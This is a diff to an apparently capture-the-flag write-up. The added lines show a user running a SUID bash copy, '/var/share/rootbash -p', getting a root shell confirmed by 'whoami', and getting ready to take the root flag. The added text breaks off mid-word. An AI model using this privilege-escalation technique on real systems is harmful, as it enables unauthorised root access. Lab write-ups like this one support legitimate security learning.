@@ -827,8 +827,17 @@ spencer@ip-10-0-20-19:/var/share$
 Now the file has full permissions, i should be able to execute it
 
 ```python
-
+spencer@ip-10-0-20-19:/var/share$ /var/share/rootbash -p
+rootbash-5.1# whoami
+root
+rootbash-5.1#
 ```
+
+Now i can use it to become root
+
+![](Pasted%20image%2020261009182528.png)
+
+Then i can get the root fla
 
 
 
